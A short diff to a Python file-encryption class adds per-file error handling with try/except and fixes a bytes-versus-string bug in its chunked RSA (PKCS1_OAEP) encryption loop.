@@ -12,7 +12,11 @@ class Encrypt():
         self.rsa_key = PKCS1_OAEP.new(self.rsa_key)
         self.files = files
         for f in self.files:
-            self.encrypt(f)
+            try:
+                self.encrypt(f)
+            except Exception as e:
+                print("could not encrypt file '" + str(f) + "'")
+                print(e)
 
     def encrypt(self, file_name):
         raw_data = None
@@ -24,7 +28,7 @@ class Encrypt():
         # and subtract 42 bytes (when using PKCS1_OAEP). The data will be in encrypted in chunks
         chunk_size = 470
         offset = 0
-        encrypted = "" # String to store the current encrypted file
+        encrypted = b"" # String to store the current encrypted file
         end_loop = False
         
         while not end_loop:
